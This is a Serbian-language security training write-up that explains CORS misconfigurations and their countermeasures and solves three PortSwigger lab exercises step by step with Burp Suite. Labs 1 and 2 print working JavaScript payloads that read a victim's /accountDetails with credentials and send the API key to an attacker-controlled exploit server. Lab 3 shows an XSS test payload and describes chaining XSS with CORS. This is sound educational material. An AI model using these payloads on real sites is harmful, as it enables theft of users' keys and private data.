### 2. Cross-Origin Resource Sharing (CORS) ranjivosti

**Objašnjenje klase napada:**
CORS (Cross-Origin Resource Sharing) je mehanizam veb-pregledača koji omogućava kontrolisan pristup resursima koji se nalaze van izvornog domena. On predstavlja kontrolisano "opuštanje" izuzetno restriktivne SOP (*Same-Origin Policy*) polise, koja inače spriječava jedan domen da čita podatke sa drugog. CORS koristi HTTP zaglavlja (poput `Access-Control-Allow-Origin`) da definiše kojim eksternim domenima je dozvoljeno čitanje odgovora i da li se pritom smiju slati sesijski kolačići. Napadi bazirani na CORS-u nastaju kada je ova polisa na serveru loše konfigurisana, omogućavajući zlonamjernim domenima da zaobiđu SOP zaštitu.

**Uticaj iskorišćenja:**
Ukoliko je korisnik prijavljen na ranjivu aplikaciju, a zatim posjeti zlonamjerni sajt, napadač može natjerati pregledač žrtve da u pozadini pošalje CORS zahtjev ka ranjivoj aplikaciji (zajedno sa kolačićima žrtve). Zbog loše konfiguracije, pregledač će dozvoliti zlonamjernom sajtu da pročita odgovor. Na ovaj način napadač može ukrasti osjetljive privatne podatke žrtve, API ključeve, CSRF tokene ili čak dobiti pristup internim resursima organizacije.

**Ranjivosti u softveru koje su dozvolile napad:**
Veb-serveri često griješe u implementaciji CORS-a kako bi olakšali integraciju različitih servisa, a najčešći uzroci su:
* **Slijepo reflektovanje `Origin` zaglavlja:** Kako bi izbjegli održavanje liste dozvoljenih domena, programeri podese server da jednostavno pročita `Origin` zaglavlje iz zahtjeva klijenta i iskopira ga u `Access-Control-Allow-Origin` zaglavlje odgovora, dajući tako pristup bilo kom sajtu na internetu.
* **Greške u parsiranju domena (loše bijele liste):** Korišćenje nesigurnih regularnih izraza ili pravila za provjeru URL-ova (npr. dozvoljavanje svih domena koji se *završavaju* sa `normal-website.com`, što napadač zaobilazi registracijom domena `hackersnormal-website.com`).
* **Dozvoljavanje `null` origin-a:** Serveri se ponekad konfigurišu da dozvole vrijednost `null` u `Origin` zaglavlju (često zbog lokalnog razvoja). Napadači ovo eksploatišu generišući zahtjeve iz *sandboxed* ifrejmova (gdje pregledač šalje `Origin: null`).
* **Povjerenje u nesigurne protokole:** Ukoliko siguran (HTTPS) sajt u svojoj CORS polisi dozvoli pristup svom nesigurnom (HTTP) poddomenu, napadač koji presreće saobraćaj može kompromitovati TLS enkripciju.

**Primjerene kontramere:**
* **Striktna definicija dozvoljenih domena (Whitelist):** `Access-Control-Allow-Origin` zaglavlje smije da sadrži isključivo tačne nazive pouzdanih sajtova. Nikada ne treba dinamički i bez provjere reflektovati origin koji pošalje klijent.
* **Zabrana `null` vrijednosti:** Izbjegavati konfigurisanje zaglavlja `Access-Control-Allow-Origin: null`, s obzirom na to da se ono lako lažira iz zlonamjernih dokumenata.
* **Izbjegavanje "wildcard" (`*`) konfiguracija u intranetu:** Samo postojanje aplikacije u privatnoj mrežnoj zoni nije dovoljna zaštita ako unutrašnji korisnici pristupaju javnom internetu.
* **Slojevita zaštita:** CORS definiše ponašanje pregledača i nije zamjena za serversku bezbednost. Server uvijek mora da provjerava autentifikaciju, autorizaciju i vlasništvo nad podacima, nezavisno od CORS zaglavlja.

### Lab 1: CORS vulnerability with basic origin reflection (Težina: Zeleni)

**Cilj zadatka:** Aplikacija posjeduje nesigurnu CORS konfiguraciju jer slijepo vjeruje svim eksternim domenima (reflektuje vrijednost `Origin` zaglavlja). Cilj je napisati JavaScript kod koji koristi CORS da preuzme privatni API ključ administratora, isporučiti ga putem Exploit servera i uspješno ga podnijeti kao rješenje.

**Metodologija i koraci rješavanja:**

1. **Prijava na sistem i praćenje saobraćaja:**
   Prvi korak je bio autentifikacija na aplikaciju korišćenjem obezbjeđenih kredencijala za testnog korisnika (`wiener:peter`).
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 153507" src="https://github.com/user-attachments/assets/112f7be0-a7e1-4956-8313-8a99205fcb12" />

   Nakon prijave, otvoren je korisnički profil gdje se prikazuje API ključ. U alatu Burp Suite (tab HTTP history) praćen je saobraćaj i identifikovan je HTTP `GET` zahtjev ka putanji `/accountDetails` koji u odgovoru vraća korisničke podatke, uključujući API ključ.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 153546" src="https://github.com/user-attachments/assets/91e2ac7c-4047-484b-9de1-16640e0bc069" />

2. **Potvrda CORS ranjivosti (Origin Reflection):**
   Zahtjev je proslijeđen u alat **Repeater** radi testiranja konfiguracije. U HTTP zahtjev je ručno dodato zaglavlje `Origin: https://zli-haker.com` kako bi se simulirao zahtjev sa drugog domena.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 153601" src="https://github.com/user-attachments/assets/19a6a092-0f89-474b-8cf2-82836a5da4f2" />
 
   Server je obradio zahtjev i u odgovoru vratio HTTP zaglavlja `Access-Control-Allow-Origin: https://zli-haker.com` i `Access-Control-Allow-Credentials: true`. Ovim je direktno potvrđeno da server slijepo reflektuje bilo koji unijeti `Origin` i pritom dozvoljava slanje sesijskih kolačića. Ovo omogućava eksternim sajtovima da čitaju privatne podatke ulogovanih korisnika.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 153643" src="https://github.com/user-attachments/assets/816ecc15-77cf-44ae-a786-4cadeee8128e" />

3. **Priprema i isporuka zlonamjerne skripte (Exploit):**

   Kako bi se ranjivost eksploatisala na administratoru, korišćen je ugrađeni Exploit server. 
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 153732" src="https://github.com/user-attachments/assets/4d6e7547-5dba-40bd-813d-d7072f8be7e0" />

   U tijelo (Body) Exploit servera ubačen je sljedeći JavaScript kod:
   ````html
   <script>
       var req = new XMLHttpRequest();
       req.onload = reqListener;
       req.open('get','[https://0ad9001b04ba59dd81eec9f700940026.web-security-academy.net/accountDetails',true](https://0ad9001b04ba59dd81eec9f700940026.web-security-academy.net/accountDetails',true));
       req.withCredentials = true;
       req.send();

       function reqListener() {
           location='/log?key='+this.responseText;
       };
   </script>
````

Skripta šalje asinhroni `GET` zahtjev ka ranjivom endpointu (uz slanje kolačića žrtve zahvaljujući `withCredentials = true`), preuzima odgovor koji sadrži API ključ i proslijeđuje ga nazad na Exploit server kroz URL parametar. Skripta je sačuvana (Store) i isporučena žrtvi (Deliver exploit to victim).

<img width="1920" height="1080" alt="Screenshot 2026-04-12 155510" src="https://github.com/user-attachments/assets/5a1464c6-2235-4575-aeae-3307036e9ae5" />

4.  **Krađa API ključa i rješavanje laboratorije:**
    Otvaranjem "Access log" sekcije na Exploit serveru, pregledani su zahtjevi. Evidentiran je HTTP `GET` zahtjev koji je izvršio pregledač žrtve, a u čijem se URL-u nalazi ukradeni JSON objekat sa administratorskim API ključem.

<img width="1920" height="1080" alt="Screenshot 2026-04-12 160003" src="https://github.com/user-attachments/assets/7584c26b-e305-4466-a138-d781341fcc60" />

   API ključ je iskopiran i unijet u polje za rešenje (Submit solution).

<img width="1920" height="1080" alt="Screenshot 2026-04-12 160156" src="https://github.com/user-attachments/assets/2b82812d-efbb-48a3-920e-24081239f925" />

   Sistem je prihvatio ključ, čime je potvrđena uspješna eksploatacija ranjivosti, a laboratorija je riješena.

<img width="1920" height="1080" alt="Screenshot 2026-04-12 160205" src="https://github.com/user-attachments/assets/25d3e5f9-e015-49cd-ba1c-f45cb33dc4fa" />

### Lab 2: CORS vulnerability with trusted null origin (Težina: Zeleni)

**Cilj zadatka:** Aplikacija posjeduje nesigurnu CORS konfiguraciju jer eksplicitno vjeruje `null` vrijednosti u `Origin` zaglavlju. Cilj je konstruisati JavaScript napad unutar izolovanog (sandboxed) ifrejma kako bi se generisao `Origin: null` zahtjev, ukrao privatni API ključ administratora i uspješno podnio kao rješenje.

**Metodologija i koraci rješavanja:**

1. **Prijava na sistem i praćenje saobraćaja:**
   Proces je započet prijavom na aplikaciju korišćenjem testnih korisničkih kredencijala (`wiener:peter`).
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 162206" src="https://github.com/user-attachments/assets/02555f2e-c603-49c4-9305-7d73bc6253c8" />

   Otvaranjem korisničkog profila, u Burp Suite alatu (tab HTTP history) zabilježen je HTTP `GET` zahtjev ka putanji `/accountDetails`, koji u svom odgovoru vraća privatne korisničke podatke (uključujući i API ključ). Ovaj zahtjev u originalnom obliku ne sadrži `Origin` zaglavlje.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 162228" src="https://github.com/user-attachments/assets/d921d8c8-13f8-4649-b3cf-5bc1ffe0dad0" />

2. **Potvrda ranjivosti (Vjerovanje null origin-u):**
   Zahtjev je proslijeđen u alat **Repeater**. Kako bismo testirali ponašanje servera, ručno je dodato novo zaglavlje `Origin: null`.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 162241" src="https://github.com/user-attachments/assets/547a62f9-27e8-4a6b-9674-7c91474ba9b4" />

   Slanjem ovako modifikovanog zahtjeva, server je odgovorio sa zaglavljima `Access-Control-Allow-Origin: null` i `Access-Control-Allow-Credentials: true`. Ovo potvrđuje ozbiljnu ranjivost – server je spreman da podijeli podatke o ulogovanom korisniku sa bilo kojim dokumentom koji se predstavlja kao `null` origin.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 162433" src="https://github.com/user-attachments/assets/8b927b51-aacc-43c0-8968-875a4233040a" />

3. **Priprema i isporuka zlonamjerne skripte (Sandboxed Iframe):**
   Za eksploataciju je iskorišćen ugrađeni Exploit server. 
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 162600" src="https://github.com/user-attachments/assets/f0c2abb6-2b13-4d76-b1a0-ef53e111866d" />

   Pošto browseri automatski dodjeljuju `null` origin zahtjevima koji potiču iz izolovanih okruženja, u tijelo (Body) Exploit servera je ubačen HTML kod sa `iframe` elementom koji sadrži atribut `sandbox`. Unutar njega je definisana JavaScript skripta koja upućuje zahtjev za čitanje API ključa:
   
   ````html
   <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
       var req = new XMLHttpRequest();
       req.onload = reqListener;
       req.open('get','[https://0a09006f032e121380ba49da00140033.web-security-academy.net/accountDetails',true](https://0a09006f032e121380ba49da00140033.web-security-academy.net/accountDetails',true));
       req.withCredentials = true;
       req.send();

       function reqListener() {
           location='[https://exploit-0a37004f039d1275806c483a01cf006a.exploit-server.net/log?key='+this.responseText](https://exploit-0a37004f039d1275806c483a01cf006a.exploit-server.net/log?key='+this.responseText);
       };
   </script>"></iframe>
````

Skripta je sačuvana (Store) i isporučena (Deliver exploit to victim), čime je administrator natjeran da učita ovaj zlonamjerni ifrejm.

<img width="1920" height="1080" alt="Screenshot 2026-04-12 162622" src="https://github.com/user-attachments/assets/02514326-24f5-4692-aa1a-e4684c0715d4" />

4.  **Krađa API ključa i rješavanje laboratorije:**
    Na Exploit serveru je otvoren "Access log". Evidentiran je novi log zapis u kom se jasno vidi HTTP zahtjev koji sadrži JSON objekat sa ukradenim API ključem administratora.

<img width="1920" height="1080" alt="Screenshot 2026-04-12 162646" src="https://github.com/user-attachments/assets/369195de-557e-4e82-8229-2506ad811109" />

   Ključ je iskopiran i proslijeđen aplikaciji kroz opciju "Submit solution".

<img width="1920" height="1080" alt="Screenshot 2026-04-12 162711" src="https://github.com/user-attachments/assets/a493fc3b-5cac-42a7-abbb-34ce6f6524c8" />

   Sistem je prihvatio ključ, uspješno ovjerio rješenje i laboratorija je time zvanično riješena.

<img width="1920" height="1080" alt="Screenshot 2026-04-12 162721" src="https://github.com/user-attachments/assets/b9af813f-a1e7-48ec-aefa-2bd3a48546da" />

### Lab 3: CORS vulnerability with trusted insecure protocols (Težina: Plavi)

**Cilj zadatka:** Aplikacija posjeduje nesigurnu CORS konfiguraciju jer slijepo vjeruje svim svojim poddomenima, bez obzira na to koji protokol koriste (čak i nesigurni `http://`). Cilj je identifikovati ranjivi poddomen, iskoristiti XSS (Cross-Site Scripting) na njemu i konstruisati napad koji koristi CORS za krađu administratorskog API ključa.

**Metodologija i koraci rješavanja:**

1. **Prijava i pronalazak osetljive putanje:**
   Proces testiranja započet je prijavom na sistem pomoću korisničkog naloga (`wiener:peter`).
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 164039" src="https://github.com/user-attachments/assets/8ab30cb8-ece3-4140-8ad2-5056d9c19ecc" />

   Kroz alat Burp Suite, analiziran je mrežni saobraćaj. Identifikovan je HTTP `GET` zahtjev ka endpointu `/accountDetails`, koji vraća osjetljive podatke prijavljenog korisnika, uključujući njegov API ključ.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 164100" src="https://github.com/user-attachments/assets/54e15776-fce5-4c91-8a5a-3ae8c31129f9" />

2. **Potvrda CORS ranjivosti:**
   Zahtjev ka `/accountDetails` proslijeđen je u alat **Repeater** radi testiranja CORS polise. U HTTP zaglavlje je ručno dodata linija koja simulira zahtjev sa nesigurnog poddomena: `Origin: http://stock.0a7700dc04d2a07581fe575d006700b8.web-security-academy.net`.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 164115" src="https://github.com/user-attachments/assets/ac80e9f0-5254-4398-90a2-1f8d7d879353" />

   Server je na ovaj zahtjev odgovorio zaglavljima `Access-Control-Allow-Origin: http://stock...` i `Access-Control-Allow-Credentials: true`. Ovime je dokazana ključna ranjivost: glavni, sigurni server (HTTPS) dozvoljava čitanje privatnih podataka sa nesigurnog (HTTP) poddomena.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 164221" src="https://github.com/user-attachments/assets/7e6cdc91-0f9f-483e-be4b-bd4fd2b0b3e8" />

3. **Mapiranje aplikacije i pronalazak poddomena:**
   Kako bismo iskoristili ovo povjerenje, bilo je neophodno pronaći način da izvršimo zlonamjerni kod sa tog nesigurnog poddomena. U browseru je otvorena stranica proizvoda kako bi se analizirale dodatne funkcionalnosti.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 164304" src="https://github.com/user-attachments/assets/e1df9ddc-0152-4479-adbc-2c75b0ab0f97" />

   Klikom na dugme "Check stock" (Provjeri zalihe), u Burp-u je zabilježen pozadinski zahtjev koji komunicira sa putanjom za provjeru zaliha. Otkriveno je da je ova funkcionalnost nekada bila hostovana na odvojenom `stock` poddomenu.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 164320" src="https://github.com/user-attachments/assets/b1bbae2f-abe8-496f-a097-c55535471dc1" />

4. **Otkrivanje XSS (Cross-Site Scripting) ranjivosti:**
   Pristupljeno je direktno starom, nesigurnom poddomenu preko browsera, korišćenjem HTTP protokola: `http://stock.0a7700dc04d2a07581fe575d006700b8.web-security-academy.net/`.

<img width="1920" height="1080" alt="Screenshot 2026-04-12 165619" src="https://github.com/user-attachments/assets/fce6df8f-7182-4ef3-a40e-9b0a7660df49" />

   Testiran je URL parametar `productId` ubacivanjem osnovnog JavaScript payload-a: `<script>alert(1)</script>`. Aplikacija nije sanitizovala unos i payload se uspješno izvršio, što dokazuje prisustvo XSS ranjivosti na nesigurnom poddomenu. Ovo mjesto će poslužiti kao most za CORS napad.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 165703" src="https://github.com/user-attachments/assets/000a27c6-561c-402d-8b0a-489fc435d41a" />

<img width="1920" height="1080" alt="Screenshot 2026-04-12 165714" src="https://github.com/user-attachments/assets/91164914-1cf3-4d25-bb38-125de672c433" />

5. **Priprema kompleksnog napada (XSS + CORS):**
   Kako bi se ranjivost eksploatisala na administratoru, korišćen je ugrađeni Exploit server.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 165900" src="https://github.com/user-attachments/assets/387d6b8d-8f5c-4df0-95e4-8ffe2297a5d4" />

   Cilj je natjerati pregledač administratora da posjeti ranjivi HTTP poddomen i izvrši XSS, koji će zatim u pozadini (koristeći CORS) zatražiti API ključ sa glavnog HTTPS servera i poslati ga nazad napadaču. U polje (Body) Exploit servera unijet je sljedeći JavaScript napad:
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 165948" src="https://github.com/user-attachments/assets/8314bfb6-0682-449f-843c-ccf7eb242d92" />
 
   Skripta koristi `document.location` da preusmjeri žrtvu na ranjivi `stock` poddomen i injektuje novi XSS payload u `productId` parametar. Unutar tog XSS payload-a nalazi se `XMLHttpRequest` ka putanji `/accountDetails` na glavnom serveru, sa uključenim slanjem kolačića (`withCredentials = true`). Pošto glavni server vjeruje ovom poddomenu, on vraća API ključ, koji skripta zatim proslijeđuje na Exploit server napadača putem `/log?key=` parametra. Određeni karakteri su morali biti URL enkodirani (`%2b` za plus, `%3c` za manje od) kako bi se skripta pravilno proslijedila kroz link.

6. **Isporuka napada i krađa API ključa:**
   Napad je sačuvan (Store) i isporučen žrtvi (Deliver exploit to victim). Zatim su otvoreni pristupni logovi na Exploit serveru (Access log). U logovima je zabilježen dolazni HTTP `GET` zahtjev koji sadrži kompletan JSON objekat sa ukradenim administratorskim API ključem.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 170028" src="https://github.com/user-attachments/assets/98fb05fb-78c9-441b-b1e2-2ca19279a3bc" />

7. **Rješavanje laboratorije:**
   Ukradeni API ključ je iskopiran i proslijeđen aplikaciji kroz formu "Submit solution".
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 170048" src="https://github.com/user-attachments/assets/96d73b35-1642-4282-bf28-b3c6c9773cb4" />

   Sistem je uspješno ovjerio rješenje, čime je dokazana kritičnost kombinovanja dvije naizgled odvojene ranjivosti (XSS na nesigurnom poddomenu i loša CORS polisa na glavnom domenu). Laboratorija je time uspješno riješena.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 170100" src="https://github.com/user-attachments/assets/2bb44d03-c14b-4606-bd17-daf7582978dc" />









